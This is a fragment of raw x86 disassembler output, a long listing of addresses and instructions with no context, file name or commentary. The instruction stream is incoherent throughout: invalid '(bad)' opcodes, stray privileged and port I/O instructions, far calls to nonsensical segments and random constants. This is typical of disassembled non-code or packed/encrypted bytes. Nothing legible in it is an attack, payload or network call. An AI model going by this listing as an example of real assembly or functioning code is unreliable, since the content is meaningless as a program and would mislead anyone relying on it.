  417514:	pusha  
  417515:	jle    0x4174ce
  417517:	sbb    eax,0x127b7515
  41751c:	push   esi
  41751d:	pop    ebp
  41751e:	dec    ecx
  41751f:	cli    
  417520:	mov    ah,0x20
  417522:	test   DWORD PTR [edx+0x3a2e5252],esi
  417528:	add    bl,BYTE PTR [ebx+0xb]
  41752b:	ins    DWORD PTR es:[edi],dx
  41752c:	test   al,0x65
  41752e:	dec    ebx
  41752f:	in     al,0xd5
  417531:	pop    eax
  417532:	or     DWORD PTR cs:[edx-0x2437c49c],eax
  417539:	jb     0x41753b
  41753b:	sti    
  41753c:	fnsave [edx+0x7b]
  41753f:	mov    al,ds:0xcefaedc2
  417544:	mov    ch,0x7e
  417546:	scas   eax,DWORD PTR es:[edi]
  417547:	aad    0x8e
  417549:	sub    dl,BYTE PTR [eax+0x7a]
  41754c:	push   0xc10d25
  417551:	mov    al,0x45
  417553:	lahf   
  417554:	jecxz  0x4174ee
  417556:	cmp    BYTE PTR [edx+0x5c],dl
  417559:	add    ax,0x8d2e
  41755d:	push   esi
  41755e:	sub    BYTE PTR [ebp-0x56],bl
  417561:	icebp  
  417562:	push   cs
  417563:	inc    ecx
  417564:	mov    eax,DWORD PTR [ebp+0x14]
  417567:	mov    DWORD PTR [edi],0x1cb22b2f
  41756d:	stc    
  41756e:	cmp    al,0x9f
  417570:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417571:	xchg   ebp,eax
  417572:	pop    ss
  417573:	push   esi
  417574:	xchg   esp,eax
  417575:	inc    esi
  417576:	pop    ds
  417577:	xchg   esp,eax
  417578:	mov    ds:0x6dca8857,eax
  41757d:	icebp  
  41757e:	xchg   ebp,eax
  41757f:	enter  0xe6a4,0x42
  417583:	push   ebp
  417584:	cmp    DWORD PTR [ebp-0x42],esp
  417587:	or     dl,cl
  417589:	xor    BYTE PTR [esi-0x39],bh
  41758c:	add    DWORD PTR [eax+0x24d3316d],edi
  417592:	aaa    
  417593:	or     eax,0x3eb35450
  417598:	stos   BYTE PTR es:[edi],al
  417599:	sbb    esp,DWORD PTR [edi+esi*1+0x4c]
  41759d:	rcl    BYTE PTR [ebx-0x56],cl
  4175a0:	out    0x3b,al
  4175a2:	add    al,0x11
  4175a4:	mov    eax,0xb51e1c7
  4175a9:	rcl    BYTE PTR [edx+ebp*1-0x23],0x96
  4175ae:	sar    ecx,cl
  4175b0:	adc    al,0xb1
  4175b2:	cmp    BYTE PTR [edx+edi*4+0x3613f9a],bh
  4175b9:	je     0x417560
  4175bb:	push   esp
  4175bc:	pushf  
  4175bd:	jecxz  0x4175e0
  4175bf:	pop    ecx
  4175c0:	and    al,0x3c
  4175c2:	unpcklps xmm6,XMMWORD PTR [ecx+eax*8]
  4175c6:	call   0xdc48c3f6
  4175cb:	je     0x41764a
  4175cd:	mov    edi,0xb18376cd
  4175d2:	popf   
  4175d3:	icebp  
  4175d4:	mov    dl,0x0
  4175d6:	cmp    dl,ch
  4175d8:	pushf  
  4175d9:	xchg   edi,eax
  4175da:	iret   
  4175db:	mov    edi,0x63398b03
  4175e0:	mov    al,fs:0x5d913dea
  4175e6:	daa    
  4175e7:	cmc    
  4175e8:	gs dec esi
  4175ea:	mov    ah,0x5c
  4175ec:	sti    
  4175ed:	jnp    0x417616
  4175ef:	mov    edi,0x8888fe81
  4175f4:	call   0x68b3:0x7767b320
  4175fb:	adc    al,0x37
  4175fd:	xor    al,bh
  4175ff:	ins    BYTE PTR es:[edi],dx
  417600:	arpl   bx,di
  417602:	in     eax,dx
  417603:	jae    0x4175f5
  417605:	fadd   DWORD PTR [ebx-0x77]
  417608:	pop    esi
  417609:	cwde   
  41760a:	dec    ebp
  41760b:	hlt    
  41760c:	popa   
  41760d:	ret    
  41760e:	in     al,0x13
  417610:	jp     0x417624
  417612:	mov    al,0x13
  417614:	mov    edx,0x104057b1
  417619:	mov    ecx,0x8b373bec
  41761e:	sbb    BYTE PTR [edi-0x19],al
  417621:	leave  
  417622:	test   BYTE PTR [edi+eax*8+0x3e],bh
  417626:	sub    ecx,DWORD PTR [edi-0x64]
  417629:	fstp   TBYTE PTR [ebx]
  41762b:	inc    ecx
  41762c:	jecxz  0x417686
  41762e:	out    dx,eax
  41762f:	sub    DWORD PTR [ebx-0x725b5482],eax
  417635:	xlat   BYTE PTR ds:[ebx]
  417636:	(bad)  
  417637:	cmp    BYTE PTR [eax-0x51],cl
  41763a:	test   DWORD PTR [esi+0x1a27f896],ebp
  417640:	pop    eax
  417641:	push   ebp
  417642:	dec    eax
  417643:	push   ss
  417644:	mov    edi,0x2e0057dd
  417649:	cmp    eax,0xf4fda3de
  41764e:	fcmovu st,st(2)
  417650:	add    dl,BYTE PTR [edx]
  417652:	pop    DWORD PTR [edi+0x4af1c72d]
  417658:	adc    BYTE PTR [ebx+0x165694a4],ch
  41765e:	bound  esp,QWORD PTR [eax+ebp*1+0x72]
  417662:	loope  0x41767c
  417664:	jne    0x4175f2
  417666:	cmp    esp,esp
  417668:	lock popf 
  41766a:	xor    edx,DWORD PTR [esi+0x66]
  41766d:	jge    0x41760c
  41766f:	xchg   esp,eax
  417670:	loopne 0x4176ce
  417672:	fmul   DWORD PTR [edx+0x4]
  417675:	jae    0x417698
  417677:	loop   0x417656
  417679:	arpl   sp,dx
  41767b:	dec    DWORD PTR [esi-0x43f96c7c]
  417681:	imul   ebx,DWORD PTR [edi+0x0],0x66
  417685:	out    0x59,al
  417687:	pop    eax
  417688:	pop    esi
  417689:	not    DWORD PTR [esi]
  41768b:	sahf   
  41768c:	fs loope 0x4176fe
  41768f:	ss ds inc edi
  417692:	mov    esp,ebp
  417694:	adc    edx,DWORD PTR [edi-0x4cf1ad18]
  41769a:	push   ecx
  41769b:	mov    ebp,0x520139a3
  4176a0:	jecxz  0x4176c0
  4176a2:	push   eax
  4176a3:	in     eax,0x94
  4176a5:	aas    
  4176a6:	mov    ds:0x5d975b08,al
  4176ab:	mov    esp,0x140e5bfd
  4176b0:	sbb    eax,0x86c30331
  4176b5:	or     DWORD PTR [ecx+ebx*1],0xd339c903
  4176bc:	or     eax,0xff304984
  4176c1:	pushf  
  4176c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4176c3:	push   ebx
  4176c4:	add    DWORD PTR [ebp-0x1889812e],esp
  4176ca:	or     ah,dl
  4176cc:	xchg   esi,eax
  4176cd:	cmc    
  4176ce:	adc    al,0x4d
  4176d0:	js     0x4176f9
  4176d2:	jle    0x4176ee
  4176d4:	ds push es
  4176d6:	enter  0xb10c,0x3d
  4176da:	outs   dx,DWORD PTR ds:[esi]
  4176db:	mov    al,0x2d
  4176dd:	daa    
  4176de:	xlat   BYTE PTR ds:[ebx]
  4176df:	pop    esi
  4176e0:	inc    esi
  4176e1:	fstp   TBYTE PTR [ebx-0x554ff7be]
  4176e7:	jne    0x4176af
  4176e9:	adc    eax,0xa3ccb3d8
  4176ee:	lea    ebx,[eax+0x42159532]
  4176f4:	sahf   
  4176f5:	adc    al,0x25
  4176f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4176f8:	adc    DWORD PTR [esi],0xc0b9a15b
  4176fe:	je     0x41774f
  417700:	int    0x12
  417702:	jne    0x417706
  417704:	ds dec ebx
  417706:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417707:	enter  0x556,0xb1
  41770b:	mov    dh,BYTE PTR [eax]
  41770d:	test   DWORD PTR [eax-0x54],esp
  417710:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417711:	jge    0x417727
  417713:	inc    esi
  417714:	jecxz  0x4176c3
  417716:	inc    edx
  417717:	inc    ecx
  417718:	fidivr WORD PTR [esi+esi*4-0x24]
  41771c:	jmp    0x41776a
  41771e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41771f:	cdq    
  417720:	adc    al,0x7e
  417722:	es pop ebp
  417724:	push   edx
  417725:	xor    BYTE PTR [ecx+0x4600ac9],0x42
  41772c:	sub    ecx,DWORD PTR [esi-0x2a84a5c]
  417732:	(bad)  
  417734:	in     al,dx
  417735:	int3   
  417736:	add    eax,0xb27e338e
  41773b:	add    al,0xf2
  41773d:	int    0x6
  41773f:	mov    esi,DWORD PTR [edx-0x54]
  417742:	push   edi
  417743:	mov    es,WORD PTR [ebx]
  417745:	xchg   BYTE PTR [ebp-0x4866002d],bh
  41774b:	loope  0x417765
  41774d:	inc    ebx
  41774e:	dec    esi
  41774f:	pop    es
  417750:	fdivr  DWORD PTR [esi]
  417752:	fwait
  417753:	stc    
  417754:	xor    DWORD PTR [ebp-0x69],0xffffffb2
  417758:	stos   DWORD PTR es:[edi],eax
  417759:	addr16 aas 
  41775b:	pop    edx
  41775c:	mov    ch,BYTE PTR [ebx-0x2cd4dfb5]
  417762:	out    dx,al
  417763:	into   
  417764:	pop    esi
  417765:	push   esi
  417766:	mov    esp,0x6fcd923d
  41776b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41776c:	cmp    al,0xd4
  41776e:	pop    ds
  41776f:	dec    ebx
  417770:	push   eax
  417771:	mov    BYTE PTR [edx],bh
  417773:	lahf   
  417774:	mov    dh,0xa6
  417776:	inc    ebx
  417777:	xchg   esi,eax
  417778:	xchg   DWORD PTR ds:0xa7e1df91,ebx
  41777e:	ficomp WORD PTR [ebx]
  417780:	mov    ds:0x8fbf1d64,al
  417785:	cli    
  417786:	mov    ecx,0x3aea686b
  41778b:	jno    0x4177e3
  41778d:	test   ebx,ebp
  41778f:	pop    ss
  417790:	push   cs
  417791:	retf   0x1ee2
  417794:	test   al,0x8c
  417796:	js     0x41771c
  417798:	inc    ebx
  417799:	inc    eax
  41779a:	pop    esi
  41779b:	outs   dx,BYTE PTR ds:[esi]
  41779c:	aas    
  41779d:	sub    bl,bh
  41779f:	sub    eax,0x3f41c41f
  4177a4:	stos   BYTE PTR es:[edi],al
  4177a5:	stos   DWORD PTR es:[edi],eax
  4177a6:	jns    0x417772
  4177a8:	ds mov bl,0x5e
  4177ab:	mov    bh,0xa2
  4177ad:	push   esi
  4177ae:	push   ebp
  4177af:	ins    DWORD PTR es:[edi],dx
  4177b0:	(bad)  [esi-0x7288d51d]
  4177b6:	mov    ds:0x305fdeb0,al
  4177bb:	mov    bh,0x0
  4177bd:	pop    es
  4177be:	lahf   
  4177bf:	mov    ds:0x29fb5947,al
  4177c4:	jmp    0x227dae15
  4177c9:	(bad)  
  4177ca:	shl    dh,1
  4177cc:	adc    eax,0xba800e75
  4177d1:	add    ecx,edx
  4177d3:	je     0x4177e4
  4177d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4177d6:	xchg   DWORD PTR ds:0xc90dbb97,ecx
  4177dc:	mov    ebx,0xebca87e4
  4177e1:	xchg   esi,eax
  4177e2:	mov    eax,ds:0xfd0bb4f6
  4177e7:	jecxz  0x41779d
  4177e9:	jno    0x4177b7
  4177eb:	inc    esp
  4177ec:	rcl    BYTE PTR [eax],1
  4177ee:	adc    BYTE PTR ss:[ebx+0x1769acc3],cl
  4177f5:	not    BYTE PTR [esi+0x1]
  4177f8:	fwait
  4177f9:	xchg   edx,eax
  4177fa:	mov    ebx,0xa0674bfa
  4177ff:	(bad)  
  417800:	and    al,0xc
  417802:	xchg   ebp,eax
  417803:	ret    
  417804:	pop    edi
  417805:	and    edx,esp
  417807:	mov    al,0xb5
  417809:	sub    esp,edi
  41780b:	aam    0x5a
  41780d:	in     eax,0x4c
  41780f:	push   es
  417810:	mov    BYTE PTR [ebx+ebx*2],ah
  417813:	rcr    BYTE PTR [ebx+0x69],cl
  417816:	pop    ebx
  417817:	ins    DWORD PTR es:[edi],dx
  417818:	ins    DWORD PTR es:[edi],dx
  417819:	xchg   DWORD PTR [ecx],eax
  41781b:	out    0xa7,al
  41781d:	mov    dl,0x5f
  41781f:	fsubr  DWORD PTR [ebx-0x64]
  417822:	cmp    ebp,DWORD PTR [esi+0x1791a0bc]
  417828:	ins    BYTE PTR es:[edi],dx
  417829:	fimul  WORD PTR ds:0x395ea891
  41782f:	sub    BYTE PTR [ebx+0x16],cl
  417832:	int3   
  417833:	jo     0x4177c2
  417835:	pop    eax
  417836:	sub    DWORD PTR [ebx-0x77],esp
  417839:	cmc    
  41783a:	push   ecx
  41783b:	fwait
  41783c:	out    dx,al
  41783d:	in     al,dx
  41783e:	sub    al,0xbd
  417840:	imul   ebx,DWORD PTR gs:[ecx-0x74],0xffffffa6
  417845:	fsub   QWORD PTR [eax-0x5a]
  417848:	fadd   st,st(3)
  41784a:	rcr    DWORD PTR [ebp+0x6304de64],1
  417850:	add    BYTE PTR [ecx],bh
  417852:	in     eax,dx
  417853:	jmp    DWORD PTR [ebp-0x26b821c0]
  417859:	lods   al,BYTE PTR ds:[esi]
  41785a:	in     al,dx
  41785b:	ret    0x7a4a
  41785e:	jmp    0xa137:0xb851cda4
  417865:	(bad)  [ebp-0x6e77fbf6]
  41786b:	int    0xd2
  41786d:	xor    bl,bl
  41786f:	cmc    
  417870:	cli    
  417871:	add    al,0x8d
  417873:	jns    0x4178a7
  417875:	xchg   ebx,eax
  417876:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  417878:	sbb    edi,edi
  41787a:	sbb    ah,BYTE PTR [edi+ecx*8]
  41787d:	jge    0x4178c5
  41787f:	add    eax,0x9d2650bf
  417884:	mov    esp,0x62afa36d
  417889:	or     eax,0x20973bc3
  41788e:	sbb    BYTE PTR [eax-0x42f6e49f],0xa7
  417895:	imul   eax,ecx,0xabfb39f5
  41789b:	aad    0x52
  41789d:	sbb    al,0x26
  41789f:	xchg   edi,eax
  4178a0:	clc    
  4178a1:	jno    0x4178a0
  4178a3:	test   al,0xb6
  4178a5:	inc    eax
  4178a6:	adc    BYTE PTR [ebp+0x7151d7e8],0xe9
  4178ad:	xchg   DWORD PTR [ebx],eax
  4178af:	jbe    0x4178c3
  4178b1:	stc    
  4178b2:	lahf   
  4178b3:	out    0xa1,al
  4178b5:	pushf  
  4178b6:	pushf  
  4178b7:	pop    ebx
  4178b8:	ins    DWORD PTR es:[edi],dx
  4178b9:	sbb    eax,0x79af5a01
  4178be:	inc    ebx
  4178bf:	dec    ebp
  4178c0:	lods   al,BYTE PTR ds:[esi]
  4178c1:	adc    eax,0x793666e1
  4178c6:	and    al,0xb0
  4178c8:	jmp    FWORD PTR [edx]
  4178ca:	mov    al,ds:0x2a71bb6
  4178cf:	leave  
  4178d0:	aaa    
  4178d1:	lock and eax,0x282f4dd2
  4178d7:	sub    DWORD PTR [ecx],edx
  4178d9:	stos   DWORD PTR es:[edi],eax
  4178da:	outs   dx,BYTE PTR ds:[esi]
  4178db:	pop    eax
  4178dc:	scas   al,BYTE PTR es:[edi]
  4178dd:	rcr    DWORD PTR [esi],cl
  4178df:	test   al,0x42
  4178e1:	push   ebp
  4178e2:	jno    0x417897
  4178e4:	mov    edx,DWORD PTR [ebx-0x4]
  4178e7:	jmp    0x417885
  4178e9:	inc    esp
  4178ea:	sub    eax,0x13d293c4
  4178ef:	push   ebp
  4178f0:	(bad)  
  4178f1:	mov    ds:0xc3af78e0,eax
  4178f6:	cwde   
  4178f7:	icebp  
  4178f8:	sub    DWORD PTR [edx+0x29],0xb6663dab
  4178ff:	dec    edi
  417900:	cli    
  417901:	or     BYTE PTR [edi],ch
  417903:	inc    esi
  417904:	xor    BYTE PTR [edi+ebp*2-0x4f],bl
  417908:	outs   dx,BYTE PTR ds:[esi]
  417909:	cwde   
  41790a:	mov    eax,0x3c36e7e4
  41790f:	fs cmp eax,0x2ea41688
  417915:	pop    ebx
  417916:	cwde   
  417917:	push   ebp
  417918:	cmp    BYTE PTR [edx],dl
  41791a:	and    WORD PTR [edi+ebp*4],bp
  41791e:	sbb    DWORD PTR [edi+0x61],esi
  417921:	cmp    dl,0xe4
  417924:	jno    0x41795c
  417926:	out    0xa9,eax
  417928:	add    al,0x75
  41792a:	in     eax,dx
  41792b:	jns    0x417941
  41792d:	or     DWORD PTR ds:0x279ff79e,ebp
  417933:	mov    ebp,0xf4382e4
  417938:	out    dx,al
  417939:	arpl   WORD PTR [eax-0x1c5cb12f],dx
  41793f:	cld    
  417940:	sub    eax,0x5c76b0d2
  417945:	sbb    DWORD PTR [edx],eax
  417947:	jecxz  0x41799f
  417949:	xor    ah,BYTE PTR [ebx-0x34d42a97]
  41794f:	sub    al,0x9a
  417951:	stc    
  417952:	lods   al,BYTE PTR ds:[esi]
  417953:	jg     0x4179aa
  417955:	and    bh,BYTE PTR [ecx]
  417957:	les    edi,FWORD PTR [eax+0x32e8eb63]
  41795d:	push   es
  41795e:	mov    ebx,0x9f7155af
  417963:	sbb    esi,DWORD PTR [ebx+0x16092726]
  417969:	mov    al,ds:0x5c62446a
  41796e:	jne    0x417963
  417970:	lahf   
  417971:	dec    edi
  417972:	rcl    DWORD PTR ds:0xae77fe47,0xbe
  417979:	xchg   ecx,eax
  41797a:	push   ebx
  41797b:	(bad)  
  41797c:	pop    edi
  41797d:	mov    esi,0xc38300c7
  417982:	ror    BYTE PTR [edi+0x6a],1
  417985:	popa   
  417986:	push   cs
  417987:	lods   eax,DWORD PTR ds:[esi]
  417988:	rcr    DWORD PTR [edx-0x2d],cl
  41798b:	mov    ecx,0x93434498
  417990:	shl    DWORD PTR [eax+0x24],0x2c
  417994:	(bad)  
  417996:	adc    eax,0x4a6a583a
  41799b:	dec    esi
  41799c:	cs cwde 
  41799e:	push   ebx
  41799f:	in     eax,0xb
  4179a1:	adc    cl,BYTE PTR [edx]
  4179a3:	mov    cl,0xfa
  4179a5:	cld    
  4179a6:	mov    edx,0xd8aca6ff
  4179ab:	xchg   edi,eax
  4179ac:	cld    
  4179ad:	push   ebx
  4179ae:	sub    ah,bl
  4179b0:	sub    DWORD PTR [esi],esp
  4179b2:	push   esi
  4179b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4179b4:	dec    ebp
  4179b5:	mov    ss,WORD PTR [eax]
  4179b7:	ficomp WORD PTR [ecx-0xd]
  4179ba:	or     ah,BYTE PTR [edx-0x2f]
  4179bd:	mov    edi,0xd94db014
  4179c2:	jg     0x41799b
  4179c4:	inc    esi
  4179c5:	or     BYTE PTR [edi],0xaa
  4179c8:	jne    0x4179a1
  4179ca:	fwait
  4179cb:	aam    0xae
  4179cd:	xchg   esp,eax
  4179ce:	ror    BYTE PTR [edi+0x2b],0xcd
  4179d2:	fcmovb st,st(3)
  4179d4:	bound  eax,QWORD PTR [eax-0x7c]
  4179d7:	dec    esp
  4179d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4179d9:	rcl    BYTE PTR [edx-0x5e87b57a],cl
  4179df:	mov    BYTE PTR [ecx+esi*4],ch
  4179e2:	sar    BYTE PTR [ebx-0x5049966f],1
  4179e8:	ins    BYTE PTR es:[edi],dx
  4179e9:	cmp    eax,0x95ee6ae9
  4179ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4179ef:	adc    ebx,DWORD PTR [ecx]
  4179f1:	cmp    ebp,DWORD PTR [edi]
  4179f3:	jp     0x417a34
  4179f5:	xchg   esi,eax
  4179f6:	lock sbb BYTE PTR [edx-0x7d],cl
  4179fa:	std    
  4179fb:	or     DWORD PTR [ecx],eax
  4179fd:	xchg   ecx,eax
  4179fe:	cmp    al,0xed
  417a00:	add    eax,0xdb98ebc0
  417a05:	int3   
  417a06:	or     BYTE PTR [esi+0x30],0x63
  417a0a:	outs   dx,WORD PTR ds:[esi]
  417a0c:	fs xchg edi,eax
  417a0e:	mov    ah,0x74
  417a10:	pop    es
  417a11:	cmp    BYTE PTR [eax-0x4cf6c9e1],bl
  417a17:	jno    0x4179cb
  417a19:	(bad)  
  417a1a:	fisubr WORD PTR [esi-0x26383a9d]
  417a20:	adc    eax,0xded9b7f0
  417a25:	es sub eax,esp
  417a28:	test   eax,0xb4aed929
  417a2d:	xor    esp,ebp
  417a2f:	cli    
  417a30:	loope  0x417a85
  417a32:	clc    
  417a33:	les    ebx,FWORD PTR [ecx-0x4c]
  417a36:	rol    dh,0x2f
  417a39:	or     eax,0xa04b7a2
  417a3e:	sub    edx,ebx
  417a40:	and    ebp,DWORD PTR [ebx+0x47b13477]
  417a46:	lods   eax,DWORD PTR ds:[esi]
  417a47:	xor    esp,DWORD PTR [ecx-0x5d]
  417a4a:	push   es
  417a4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a4c:	ins    BYTE PTR es:[edi],dx
  417a4d:	pop    esp
  417a4e:	xor    esi,ecx
  417a50:	(bad)  
  417a51:	sbb    esp,DWORD PTR [edx-0x1a]
  417a54:	mov    ds:0xf1ffabc8,eax
  417a59:	sub    esp,DWORD PTR [ebp-0x5e]
  417a5c:	mov    eax,0x1958f06e
  417a61:	mov    ebx,0x9683098c
  417a66:	repz or DWORD PTR [ecx],ebx
  417a69:	xchg   esi,eax
  417a6a:	dec    edx
  417a6b:	mov    ds:0x442071ae,eax
  417a70:	xchg   ebp,eax
  417a71:	pop    esp
  417a72:	inc    ecx
  417a73:	dec    esp
  417a74:	inc    esp
  417a75:	add    eax,DWORD PTR [edx]
  417a77:	xchg   ecx,eax
  417a78:	int3   
  417a79:	leave  
  417a7a:	loopne 0x417a94
  417a7c:	mov    dh,0x8f
  417a7e:	jge    0x417a00
  417a80:	dec    edi
  417a81:	sub    edi,esi
  417a83:	adc    eax,0xe2fabbff
  417a88:	ins    DWORD PTR es:[di],dx
  417a8a:	mov    edi,0x77cb810c
  417a8f:	cmp    eax,0x43082e2a
  417a94:	scas   eax,DWORD PTR es:[edi]
  417a95:	lods   eax,DWORD PTR ds:[esi]
  417a96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417a97:	jae    0x417a7e
  417a99:	rcl    ah,cl
  417a9b:	sti    
  417a9c:	iret   
  417a9d:	scas   eax,DWORD PTR es:[edi]
  417a9e:	push   es
  417a9f:	fiadd  DWORD PTR [eax]
  417aa1:	or     bl,bl
  417aa3:	das    
  417aa4:	mov    eax,ds:0x71baa92c
  417aa9:	mov    WORD PTR ds:0xfdfd5e3e,?
  417aaf:	mov    BYTE PTR [edx-0x40],dl
  417ab2:	data16 add al,0x5
  417ab5:	jno    0x417a8d
  417ab7:	jae    0x417a9e
  417ab9:	fs das 
  417abb:	arpl   WORD PTR [edx+0x4d953bff],dx
  417ac1:	popf   
  417ac2:	sbb    eax,0xe0c229b3
  417ac7:	rcl    esp,cl
  417ac9:	lods   al,BYTE PTR ds:[esi]
  417aca:	pop    ecx
  417acb:	mov    cl,0xcf
  417acd:	add    ch,BYTE PTR [ebp-0x5129e087]
  417ad3:	jo     0x417b4d
  417ad5:	mov    dl,0x57
  417ad7:	dec    ecx
  417ad8:	mov    eax,0x906ff13b
  417add:	pop    ebp
  417ade:	or     edi,DWORD PTR [ecx-0x240eaf29]
  417ae4:	sbb    al,0xd7
  417ae6:	dec    DWORD PTR [esp+ebx*2]
  417ae9:	bound  esp,QWORD PTR [eax+eiz*8+0x6420e86c]
  417af0:	sbb    BYTE PTR [esi+0x54],al
  417af3:	or     bh,BYTE PTR [ebx]
  417af5:	push   ds
  417af6:	shr    eax,0x4b
  417af9:	adc    al,0x54
  417afb:	xchg   edx,eax
  417afc:	inc    DWORD PTR [ebx-0x6e5da631]
  417b02:	dec    ecx
  417b03:	stos   BYTE PTR es:[edi],al
  417b04:	mov    gs,esp
  417b06:	xchg   edx,esp
  417b08:	inc    edx
  417b09:	cdq    
  417b0a:	adc    al,0x19
  417b0c:	fisttp QWORD PTR [ebp-0x3bc67b2]
  417b12:	and    BYTE PTR [ebp+0x20],0x17
  417b16:	dec    esi
  417b17:	mov    ah,0x5b
  417b19:	ret    0x6d8a
  417b1c:	inc    ebx
  417b1d:	jmp    0xe60dc832
  417b22:	lods   eax,DWORD PTR ds:[esi]
  417b23:	retf   0xaf5f
  417b26:	xor    DWORD PTR [esp+ebx*1+0x531429a8],ebp
  417b2d:	clc    
  417b2e:	dec    ecx
  417b2f:	std    
  417b30:	enter  0xf5dd,0x79
  417b34:	or     eax,DWORD PTR [edi-0x861635b]
  417b3a:	inc    esi
  417b3b:	ja     0x417ac8
  417b3d:	dec    ebp
  417b3e:	nop
  417b3f:	fcmovnu st,st(4)
  417b41:	inc    eax
  417b42:	dec    edx
  417b43:	jne    0x417ad6
  417b45:	imul   DWORD PTR [bx+si-0x5c]
  417b49:	clc    
  417b4a:	push   0xffffffa5
  417b4c:	and    eax,0x75611fb6
  417b51:	hlt    
  417b52:	sub    al,0xee
  417b54:	dec    esp
  417b55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417b56:	cmc    
  417b57:	js     0x417bb3
  417b59:	xlat   BYTE PTR ds:[ebx]
  417b5a:	pop    ebp
  417b5b:	test   al,0x20
  417b5d:	mov    dh,0xd2
  417b5f:	daa    
  417b60:	sar    DWORD PTR [ebp+ecx*1-0x1d2b5c74],cl
  417b67:	sti    
  417b68:	mov    bh,0x3c
  417b6a:	dec    ecx
  417b6b:	inc    edx
  417b6c:	(bad)  
  417b6d:	loop   0x417bbc
  417b6f:	inc    esp
  417b70:	sub    DWORD PTR [edx],0xc63ac07d
  417b76:	lea    edi,[ebp+0x69]
  417b79:	or     edi,ecx
  417b7b:	jp     0x417b6f
  417b7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b7e:	push   cs
  417b7f:	bound  di,DWORD PTR [edi]
  417b82:	pop    ebp
  417b83:	mov    esi,0x2a5c6962
  417b88:	in     eax,dx
  417b89:	rol    esi,0x83
  417b8c:	push   esi
  417b8d:	jbe    0x417bf9
  417b8f:	adc    eax,0xa16caeb0
  417b94:	add    BYTE PTR [ecx-0x4a06cad5],bl
  417b9a:	cmp    BYTE PTR [eax],cl
  417b9c:	cli    
  417b9d:	sbb    esi,eax
  417b9f:	fsubp  st(6),st
  417ba1:	jle    0x417bcb
  417ba3:	or     ebp,DWORD PTR [eax]
  417ba5:	ret    0xf493
  417ba8:	lahf   
  417ba9:	stc    
  417baa:	(bad)  
  417bab:	mov    edi,0x6dabbc2f
  417bb0:	or     ebx,DWORD PTR [ecx+0x7e]
  417bb3:	and    BYTE PTR [esp+ebx*4+0x2f],ch
  417bb7:	jbe    0x417bf4
  417bb9:	xor    BYTE PTR [ecx+eax*1+0x4],cl
  417bbd:	ds test eax,0x119ed7b2
  417bc3:	test   DWORD PTR [ebp+0x1],ebp
  417bc6:	dec    ebp
  417bc7:	sbb    eax,esi
  417bc9:	xchg   edx,eax
  417bca:	and    DWORD PTR [ebx+0x417441b0],ebp
  417bd0:	jmp    0xd970445a
  417bd5:	mov    al,ds:0x68746300
  417bda:	push   ss
  417bdb:	dec    esp
  417bdc:	mov    edx,fs
  417bde:	push   ebx
  417bdf:	ret    
  417be0:	jp     0x417b99
  417be2:	sub    BYTE PTR [edi+0x1],dl
  417be5:	inc    edi
  417be6:	jl     0x417c4b
  417be8:	sbb    DWORD PTR [edx+0x7e],ebx
  417beb:	mov    al,BYTE PTR ds:0xc3f8be9a
  417bf1:	xor    ebx,DWORD PTR [edx]
  417bf3:	sbb    al,0x6c
  417bf5:	cmp    ebx,DWORD PTR [esi]
  417bf7:	xor    DWORD PTR [esi],esp
  417bf9:	(bad)  
  417bfa:	mov    al,0xff
  417bfc:	int    0x16
  417bfe:	outs   dx,BYTE PTR ds:[esi]
  417bff:	imul   ecx,DWORD PTR ds:0x7e8d7fc7,0x3150b33a
  417c09:	test   BYTE PTR [edx],dh
  417c0b:	sub    al,0xd3
  417c0d:	xchg   ebp,eax
  417c0e:	test   edx,edi
  417c10:	(bad)  
  417c13:	ins    BYTE PTR es:[edi],dx
  417c14:	repz pop ebp
  417c16:	cmp    al,BYTE PTR [edi+eax*1-0x2f]
  417c1a:	(bad)  [esi-0x42]
  417c1d:	les    ebp,FWORD PTR [esi+0x2ba32d76]
  417c23:	mov    ch,0xd7
  417c25:	cmp    dh,BYTE PTR ds:0x2a5d7d3b
  417c2b:	and    al,al
  417c2d:	jb     0x417c95
  417c2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417c30:	clc    
  417c31:	sbb    eax,0xa00811a5
  417c36:	(bad)  
  417c37:	test   DWORD PTR [ebp-0x13],0xbfc6d0bf
  417c3e:	in     eax,dx
  417c3f:	xor    al,0xf4
  417c41:	out    dx,al
  417c42:	mov    DWORD PTR [edx],edx
  417c44:	mov    edi,0xb1aedfed
  417c49:	pop    ebp
  417c4a:	xchg   esi,eax
  417c4b:	cmp    esp,ebx
  417c4d:	loope  0x417c87
  417c4f:	cmc    
  417c50:	cdq    
  417c51:	cdq    
  417c52:	xchg   ecx,eax
  417c53:	xor    DWORD PTR [ebx],edx
  417c55:	pop    edi
  417c56:	push   es
  417c57:	in     eax,0x27
  417c59:	dec    esi
  417c5a:	retf   
  417c5b:	jns    0x417c90
  417c5d:	xor    ebx,DWORD PTR [esi]
  417c5f:	jge    0x417c3b
  417c61:	sub    BYTE PTR [esi-0x3819c1a],dl
  417c67:	call   0xb904:0x1aede8f
  417c6e:	cmc    
  417c6f:	fstp   QWORD PTR [eax-0x7e]
  417c72:	jae    0x417c67
  417c74:	int3   
  417c75:	pop    ss
  417c76:	out    0x55,eax
  417c78:	test   eax,0x8db99c58
  417c7d:	(bad)  
  417c7e:	fsubr  DWORD PTR [esi]
  417c80:	cli    
  417c81:	mov    ds:0xc30c39ee,eax
  417c86:	inc    esp
  417c87:	lock mov WORD PTR [eax+0x16],gs
  417c8b:	xlat   BYTE PTR ds:[ebx]
  417c8c:	aaa    
  417c8d:	les    edi,FWORD PTR [edi+0x60]
  417c90:	sbb    edx,0x5
  417c93:	xchg   ebx,eax
  417c94:	dec    esp
